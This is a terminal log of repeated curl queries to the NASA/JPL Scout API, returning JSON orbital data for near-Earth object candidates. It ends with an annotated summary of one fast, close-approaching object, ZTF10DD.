{"Vmag":"18.8","rmsN":"0.42","caDist":null,"phaScore":0,"rate":"1.7","rating":0,"dec":"-40","elong":"144","moid":"2","unc":"0.02","tEphem":"2026-04-05 01:45","uncP1":"0.02","signature":{"source":"NASA/JPL Scout API","version":"1.3"},"neo1kmScore":0,"ra":"11:59","nObs":54,"tisserandScore":100,"neoScore":0,"ieoScore":0,"arc":"475.22","vInf":null,"lastRun":"2026-03-31 05:40","objectName":"A11z2Ek","geocentricScore":0,"H":"14.2"}
ajdev@rootbox:~/nassa$ curl "https://ssd-api.jpl.nasa.gov/scout.api?tdes=A11zrA3&file=log"
{"tEphem":"2026-04-05 01:45","Vmag":"20.8","phaScore":0,"ieoScore":0,"rating":0,"caDist":"3.4","elong":"165","moid":"0.009","dec":"+09","ra":"12:53","H":"25.1","vInf":"20.7","unc":"450","neoScore":100,"rate":"1.8","nObs":4,"arc":"0.50","signature":{"version":"1.3","source":"NASA/JPL Scout API"},"lastRun":"2026-03-30 03:43","neo1kmScore":0,"tisserandScore":44,"geocentricScore":0,"uncP1":"480","rmsN":"0.18","objectName":"A11zrA3"}
ajdev@rootbox:~/nassa$ curl "https://ssd-api.jpl.nasa.gov/scout.api?tdes=A11ztfv&file=log"
{"Vmag":"19.8","caDist":"9.3","rmsN":"0.67","rating":0,"rate":"5.8","phaScore":0,"elong":"158","dec":"+13","unc":"1200","moid":"0.01","tEphem":"2026-04-05 01:45","uncP1":"1500","signature":{"version":"1.3","source":"NASA/JPL Scout API"},"neo1kmScore":0,"ra":"13:36","nObs":4,"neoScore":100,"tisserandScore":56,"ieoScore":0,"arc":"0.56","vInf":"12.3","objectName":"A11ztfv","lastRun":"2026-03-30 07:59","geocentricScore":0,"H":"24.4"}
ajdev@rootbox:~/nassa$ curl "https://ssd-api.jpl.nasa.gov/scout.api?tdes=C1CWP45&file=log"
{"ieoScore":0,"caDist":null,"rating":0,"tEphem":"2026-04-05 01:45","phaScore":0,"Vmag":"23.9","H":"15.7","ra":"09:53","dec":"+35","moid":"5","elong":"121","unc":"0.81","nObs":15,"rate":"0.5","neoScore":0,"lastRun":"2026-03-20 06:12","signature":{"version":"1.3","source":"NASA/JPL Scout API"},"arc":"46.53","neo1kmScore":0,"vInf":null,"geocentricScore":0,"uncP1":"0.91","rmsN":"0.75","objectName":"C1CWP45","tisserandScore":100}
ajdev@rootbox:~/nassa$ curl "https://ssd-api.jpl.nasa.gov/scout.api?tdes=C1DW8J5&file=log"
{"arc":"22.39","vInf":"10.0","objectName":"C1DW8J5","lastRun":"2026-03-25 07:41","geocentricScore":0,"H":"28.0","neo1kmScore":0,"ra":"12:42","nObs":13,"neoScore":100,"tisserandScore":0,"ieoScore":0,"moid":"0.03","unc":"2.2","tEphem":"2026-04-05 02:00","uncP1":"2.4","signature":{"version":"1.3","source":"NASA/JPL Scout API"},"Vmag":"24.6","rmsN":"0.89","caDist":"12","rate":"1.5","phaScore":0,"rating":0,"dec":"+18","elong":"156"}
ajdev@rootbox:~/nassa$ curl "https://ssd-api.jpl.nasa.gov/scout.api?tdes=C1DX145&file=log"
{"tEphem":"2026-04-05 02:00","phaScore":0,"Vmag":"24.2","ieoScore":0,"rating":0,"caDist":"28","dec":"+01","moid":"0.03","elong":"85","H":"26.2","ra":"06:37","vInf":"20.8","lastRun":"2026-03-27 05:15","signature":{"version":"1.3","source":"NASA/JPL Scout API"},"arc":"68.00","rate":"12.7","unc":"0.69","nObs":12,"neoScore":100,"neo1kmScore":0,"tisserandScore":0,"uncP1":"0.72","geocentricScore":0,"objectName":"C1DX145","rmsN":"0.65"}
ajdev@rootbox:~/nassa$ curl "https://ssd-api.jpl.nasa.gov/scout.api?tdes=C1E21V5&file=log"
{"tisserandScore":0,"rmsN":"0.70","objectName":"C1E21V5","geocentricScore":0,"uncP1":"0.52","vInf":null,"neo1kmScore":0,"unc":"0.43","neoScore":100,"rate":"3.6","nObs":17,"lastRun":"2026-03-27 05:50","arc":"47.31","signature":{"version":"1.3","source":"NASA/JPL Scout API"},"moid":"0.1","elong":"138","dec":"+14","H":"22.6","ra":"10:24","phaScore":0,"Vmag":"22.7","tEphem":"2026-04-05 02:00","rating":0,"caDist":null,"ieoScore":0}
ajdev@rootbox:~/nassa$ curl "https://ssd-api.jpl.nasa.gov/scout.api?tdes=C1E4UV5&file=log"
{"tisserandScore":0,"geocentricScore":0,"uncP1":"0.68","rmsN":"0.46","objectName":"C1E4UV5","vInf":null,"unc":"0.56","rate":"1.1","nObs":19,"neoScore":45,"signature":{"version":"1.3","source":"NASA/JPL Scout API"},"arc":"46.93","lastRun":"2026-03-27 08:07","neo1kmScore":0,"elong":"158","moid":"0.3","dec":"+16","ra":"12:48","H":"22.9","tEphem":"2026-04-05 02:00","Vmag":"22.1","phaScore":0,"ieoScore":0,"rating":0,"caDist":null}
ajdev@rootbox:~/nassa$ curl "https://ssd-api.jpl.nasa.gov/scout.api?tdes=C1E87L5&file=log"
{"vInf":null,"neo1kmScore":0,"nObs":12,"unc":"3.4","rate":"1.9","neoScore":100,"lastRun":"2026-03-27 10:30","signature":{"version":"1.3","source":"NASA/JPL Scout API"},"arc":"28.06","tisserandScore":0,"rmsN":"0.82","objectName":"C1E87L5","geocentricScore":0,"uncP1":"4.1","phaScore":0,"Vmag":"23.1","tEphem":"2026-04-05 02:00","rating":0,"caDist":null,"ieoScore":0,"moid":"0.2","dec":"+20","elong":"144","H":"24.7","ra":"11:15"}
ajdev@rootbox:~/nassa$ curl "https://ssd-api.jpl.nasa.gov/scout.api?tdes=C1E8ZG5&file=log"
{"arc":"22.68","vInf":null,"objectName":"C1E8ZG5","lastRun":"2026-03-27 04:54","geocentricScore":0,"H":"24.6","neo1kmScore":0,"ra":"11:24","nObs":7,"neoScore":100,"tisserandScore":0,"ieoScore":0,"moid":"0.2","unc":"27","tEphem":"2026-04-05 02:00","uncP1":"33","signature":{"version":"1.3","source":"NASA/JPL Scout API"},"Vmag":"22.7","rmsN":"0.71","caDist":null,"rate":"2.8","phaScore":0,"rating":0,"dec":"+21","elong":"145"}
ajdev@rootbox:~/nassa$ curl "https://ssd-api.jpl.nasa.gov/scout.api?tdes=C1E9A15&file=log"
{"phaScore":7,"rate":"0.8","rating":0,"dec":"+09","elong":"161","Vmag":"22.9","rmsN":"0.47","caDist":null,"uncP1":"14","signature":{"version":"1.3","source":"NASA/JPL Scout API"},"moid":"0.3","unc":"12","tEphem":"2026-04-05 02:00","ieoScore":0,"tisserandScore":63,"neoScore":80,"ra":"12:07","nObs":7,"neo1kmScore":31,"geocentricScore":0,"H":"18.5","vInf":null,"objectName":"C1E9A15","lastRun":"2026-03-26 10:08","arc":"3.52"}
ajdev@rootbox:~/nassa$ curl "https://ssd-api.jpl.nasa.gov/scout.api?tdes=C1E9H35&file=log"
{"Vmag":"23.3","caDist":null,"rmsN":"0.41","rating":0,"rate":"3.1","phaScore":0,"elong":"160","dec":"-02","unc":"120","moid":"0.3","tEphem":"2026-04-05 02:00","uncP1":"140","signature":{"version":"1.3","source":"NASA/JPL Scout API"},"neo1kmScore":0,"ra":"11:35","nObs":8,"tisserandScore":29,"neoScore":77,"ieoScore":0,"arc":"2.77","vInf":null,"lastRun":"2026-03-26 23:00","objectName":"C1E9H35","geocentricScore":0,"H":"23.6"}
ajdev@rootbox:~/nassa$ curl "https://ssd-api.jpl.nasa.gov/scout.api?tdes=C1ECHV5&file=log"
{"ra":"12:48","nObs":9,"neo1kmScore":0,"tisserandScore":0,"ieoScore":0,"neoScore":100,"vInf":null,"objectName":"C1ECHV5","lastRun":"2026-03-27 06:57","arc":"22.21","geocentricScore":0,"H":"24.7","phaScore":0,"rate":"4.5","rating":0,"dec":"+14","elong":"160","Vmag":"22.9","rmsN":"0.40","caDist":null,"uncP1":"13","signature":{"version":"1.3","source":"NASA/JPL Scout API"},"moid":"0.2","unc":"11","tEphem":"2026-04-05 02:00"}
ajdev@rootbox:~/nassa$ curl "https://ssd-api.jpl.nasa.gov/scout.api?tdes=C1EDJ35&file=log"
{"objectName":"C1EDJ35","lastRun":"2026-03-29 11:01","vInf":null,"arc":"74.08","H":"22.6","geocentricScore":0,"nObs":13,"ra":"13:28","neo1kmScore":0,"neoScore":100,"tisserandScore":0,"ieoScore":0,"signature":{"version":"1.3","source":"NASA/JPL Scout API"},"uncP1":"0.23","tEphem":"2026-04-05 02:00","unc":"0.19","moid":"0.3","elong":"167","dec":"+04","rating":0,"phaScore":0,"rate":"1.7","caDist":null,"rmsN":"0.89","Vmag":"22.6"}
ajdev@rootbox:~/nassa$ curl "https://ssd-api.jpl.nasa.gov/scout.api?tdes=C1EG4F5&file=log"
{"moid":"0.1","elong":"154","dec":"+14","ra":"11:47","H":"24.6","tEphem":"2026-04-05 02:00","Vmag":"22.2","phaScore":0,"ieoScore":0,"rating":0,"caDist":null,"tisserandScore":40,"uncP1":"160","geocentricScore":0,"objectName":"C1EG4F5","rmsN":"1.01","vInf":null,"signature":{"version":"1.3","source":"NASA/JPL Scout API"},"arc":"1.88","lastRun":"2026-03-27 07:46","nObs":7,"unc":"120","rate":"3.0","neoScore":100,"neo1kmScore":0}
ajdev@rootbox:~/nassa$ curl "https://ssd-api.jpl.nasa.gov/scout.api?tdes=C1EGNW5&file=log"
{"lastRun":"2026-03-28 05:56","arc":"22.96","signature":{"version":"1.3","source":"NASA/JPL Scout API"},"unc":"1.7","nObs":11,"rate":"0.9","neoScore":100,"neo1kmScore":0,"vInf":"5.3","uncP1":"2.0","geocentricScore":0,"objectName":"C1EGNW5","rmsN":"0.77","tisserandScore":0,"ieoScore":0,"rating":0,"caDist":"14","tEphem":"2026-04-05 02:00","phaScore":0,"Vmag":"23.5","H":"26.9","ra":"12:00","elong":"158","moid":"0.007","dec":"+11"}
ajdev@rootbox:~/nassa$ curl "https://ssd-api.jpl.nasa.gov/scout.api?tdes=C1EHWQ5&file=log"
{"uncP1":"150","signature":{"version":"1.3","source":"NASA/JPL Scout API"},"moid":"0.06","unc":"120","tEphem":"2026-04-05 02:00","phaScore":0,"rate":"1.2","rating":0,"dec":"+07","elong":"167","Vmag":"22.2","rmsN":"0.53","caDist":"24","vInf":null,"objectName":"C1EHWQ5","lastRun":"2026-03-29 00:12","arc":"2.44","geocentricScore":0,"H":"25.1","ra":"12:47","nObs":9,"neo1kmScore":0,"tisserandScore":39,"neoScore":89,"ieoScore":0}
ajdev@rootbox:~/nassa$ curl "https://ssd-api.jpl.nasa.gov/scout.api?tdes=C1EHWT5&file=log"
{"arc":"2.67","vInf":null,"lastRun":"2026-03-27 10:27","objectName":"C1EHWT5","geocentricScore":0,"H":"23.3","neo1kmScore":0,"ra":"12:39","nObs":6,"tisserandScore":49,"neoScore":69,"ieoScore":0,"unc":"140","moid":"0.3","tEphem":"2026-04-05 02:00","uncP1":"170","signature":{"version":"1.3","source":"NASA/JPL Scout API"},"Vmag":"22.9","caDist":null,"rmsN":"0.31","rating":0,"phaScore":0,"rate":"3.5","elong":"157","dec":"+17"}
ajdev@rootbox:~/nassa$ curl "https://ssd-api.jpl.nasa.gov/scout.api?tdes=C1EJK35&file=log"
{"tisserandScore":42,"objectName":"C1EJK35","rmsN":"0.52","uncP1":"260","geocentricScore":0,"vInf":null,"neo1kmScore":0,"signature":{"version":"1.3","source":"NASA/JPL Scout API"},"arc":"0.94","lastRun":"2026-03-27 12:32","unc":"190","rate":"2.5","nObs":11,"neoScore":100,"moid":"0.05","dec":"+36","elong":"101","ra":"17:42","H":"22.7","Vmag":"22.0","phaScore":0,"tEphem":"2026-04-05 02:00","rating":0,"caDist":null,"ieoScore":0}
ajdev@rootbox:~/nassa$ curl "https://ssd-api.jpl.nasa.gov/scout.api?tdes=CEFL3M2&file=log"
{"tEphem":"2026-04-05 02:00","unc":"160","moid":"0.1","signature":{"version":"1.3","source":"NASA/JPL Scout API"},"uncP1":"200","caDist":null,"rmsN":"0.19","Vmag":"20.4","elong":"100","dec":"+57","rating":1,"phaScore":23,"rate":"3.1","H":"19.0","geocentricScore":0,"arc":"0.35","lastRun":"2026-03-25 12:34","objectName":"CEFL3M2","vInf":null,"neoScore":93,"tisserandScore":32,"ieoScore":0,"neo1kmScore":18,"nObs":4,"ra":"16:58"}
ajdev@rootbox:~/nassa$ curl "https://ssd-api.jpl.nasa.gov/scout.api?tdes=CEFXDG2&file=log"
{"rmsN":"0.73","objectName":"CEFXDG2","geocentricScore":0,"uncP1":"26","tisserandScore":53,"neo1kmScore":20,"neoScore":88,"unc":"21","rate":"1.3","nObs":4,"lastRun":"2026-03-28 10:31","signature":{"version":"1.3","source":"NASA/JPL Scout API"},"arc":"0.40","vInf":null,"H":"19.0","ra":"13:19","moid":"0.2","elong":"160","dec":"+13","caDist":null,"rating":0,"ieoScore":0,"phaScore":9,"Vmag":"21.9","tEphem":"2026-04-05 02:00"}
ajdev@rootbox:~/nassa$ curl "https://ssd-api.jpl.nasa.gov/scout.api?tdes=JJDS467&file=log"
{"H":"13.3","geocentricScore":0,"arc":"6.13","lastRun":"2026-03-29 15:30","objectName":"JJDS467","vInf":null,"ieoScore":0,"tisserandScore":95,"neoScore":34,"neo1kmScore":28,"nObs":3,"ra":"12:25","tEphem":"2026-04-05 02:00","moid":"1","unc":"2.5","signature":{"version":"1.3","source":"NASA/JPL Scout API"},"uncP1":"3.0","rmsN":"0.20","caDist":null,"Vmag":"21.0","dec":"-03","elong":"172","phaScore":2,"rate":"0.3","rating":0}
ajdev@rootbox:~/nassa$ curl "https://ssd-api.jpl.nasa.gov/scout.api?tdes=RdSH491&file=log"
{"Vmag":"19.4","caDist":null,"rmsN":"0.01","rating":2,"rate":"1.5","phaScore":19,"elong":"142","dec":"+19","unc":"98","moid":"0.1","tEphem":"2026-04-05 02:00","uncP1":"120","signature":{"version":"1.3","source":"NASA/JPL Scout API"},"neo1kmScore":38,"ra":"14:49","nObs":3,"neoScore":78,"tisserandScore":51,"ieoScore":0,"arc":"0.69","vInf":null,"objectName":"RdSH491","lastRun":"2026-03-22 11:41","geocentricScore":0,"H":"17.3"}
ajdev@rootbox:~/nassa$ curl "https://ssd-api.jpl.nasa.gov/scout.api?tdes=Sar2887&file=log"
{"dec":"+34","elong":"135","phaScore":0,"rate":"20.3","rating":0,"rmsN":"0.48","caDist":"7.8","Vmag":"19.5","signature":{"version":"1.3","source":"NASA/JPL Scout API"},"uncP1":"0.03","tEphem":"2026-04-05 02:00","moid":"0.02","unc":"0.01","nObs":46,"ra":"11:33","neo1kmScore":0,"ieoScore":0,"tisserandScore":0,"neoScore":100,"lastRun":"2026-04-05 01:52","objectName":"Sar2887","vInf":"6.3","arc":"38.40","H":"26.0","geocentricScore":0}
ajdev@rootbox:~/nassa$ curl "https://ssd-api.jpl.nasa.gov/scout.api?tdes=ZTF10Ct&file=log"
{"elong":"46","dec":"+32","rating":null,"phaScore":19,"rate":"0.6","caDist":null,"rmsN":"0.34","Vmag":"19.4","signature":{"version":"1.3","source":"NASA/JPL Scout API"},"uncP1":"280","tEphem":"2026-04-05 02:00","unc":"250","moid":"0.2","nObs":3,"ra":"22:14","neo1kmScore":90,"ieoScore":33,"tisserandScore":30,"neoScore":94,"lastRun":"2026-03-22 13:31","objectName":"ZTF10Ct","vInf":null,"arc":"0.19","H":"17.3","geocentricScore":0}
ajdev@rootbox:~/nassa$ curl "https://ssd-api.jpl.nasa.gov/scout.api?tdes=ZTF10Cw&file=log"
{"arc":"0.82","vInf":"22.7","lastRun":"2026-03-22 13:41","objectName":"ZTF10Cw","geocentricScore":0,"H":"21.4","neo1kmScore":0,"ra":"11:27","nObs":6,"neoScore":100,"tisserandScore":38,"ieoScore":0,"unc":"160","moid":"0.007","tEphem":"2026-04-05 02:00","uncP1":"160","signature":{"version":"1.3","source":"NASA/JPL Scout API"},"Vmag":"19.3","caDist":"5.8","rmsN":"0.71","rating":0,"rate":"0.9","phaScore":71,"elong":"156","dec":"+05"}
ajdev@rootbox:~/nassa$ curl "https://ssd-api.jpl.nasa.gov/scout.api?tdes=ZTF10DC&file=log"
{"neoScore":100,"tisserandScore":100,"ieoScore":0,"ra":"08:24","nObs":6,"neo1kmScore":0,"geocentricScore":0,"H":"20.5","vInf":"44.6","lastRun":"2026-04-04 19:25","objectName":"ZTF10DC","arc":"13.25","phaScore":100,"rate":"12.5","rating":0,"dec":"+01","elong":"112","Vmag":"18.6","rmsN":"2.58","caDist":"27","uncP1":"0.78","signature":{"version":"1.3","source":"NASA/JPL Scout API"},"moid":"0.005","unc":"0.13","tEphem":"2026-04-05 02:00"}
ajdev@rootbox:~/nassa$ curl "https://ssd-api.jpl.nasa.gov/scout.api?tdes=ZTF10DD&file=log"
{"arc":"0.95","vInf":"9.6","lastRun":"2026-04-04 17:45","objectName":"ZTF10DD","geocentricScore":2,"H":"24.8","neo1kmScore":0,"ra":"15:35","nObs":4,"ieoScore":0,"tisserandScore":54,"neoScore":100,"unc":"1200","moid":"0.001","tEphem":"2026-04-05 02:00","uncP1":"1300","signature":{"version":"1.3","source":"NASA/JPL Scout API"},"Vmag":"15.2","caDist":"0.92","rmsN":"0.65","rating":0,"rate":"80.1","phaScore":0,"elong":"129","dec":"-40"}
```

```
ZTF10DD

"caDist": "0.92"    ← 0.92 Lunar Distances (very close!)
"moid": "0.001"     ← 0.001 AU minimum orbit distance
"rate": "80.1"      ← moving at 80 arc-seconds/minute (extremely fast)
"neoScore": 100     ← 100% probability it's a NEO
"vInf": "9.6"       ← approach velocity 9.6 km/s
```